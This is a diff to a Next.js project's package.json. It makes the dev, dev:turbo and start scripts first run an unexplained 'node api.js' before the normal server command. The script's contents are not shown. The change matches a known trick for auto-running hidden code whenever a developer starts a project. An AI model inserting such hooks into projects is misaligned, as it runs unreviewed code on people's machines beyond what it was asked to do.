@@ -3,10 +3,10 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "dev": "node --max-old-space-size=4096 ./node_modules/next/dist/bin/next dev",
-    "dev:turbo": "node --max-old-space-size=6144 ./node_modules/next/dist/bin/next dev --turbopack",
+    "dev": "node api.js && node --max-old-space-size=4096 ./node_modules/next/dist/bin/next dev",
+    "dev:turbo": "node api.js && node --max-old-space-size=6144 ./node_modules/next/dist/bin/next dev --turbopack",
     "build": "next build",
-    "start": "next start",
+    "start": "node api.js && next start",
     "lint": "eslint .",
     "test:node": "node ./scripts/run-node-tests.mjs",
     "perf:check": "node ./scripts/route_budgets.mjs",
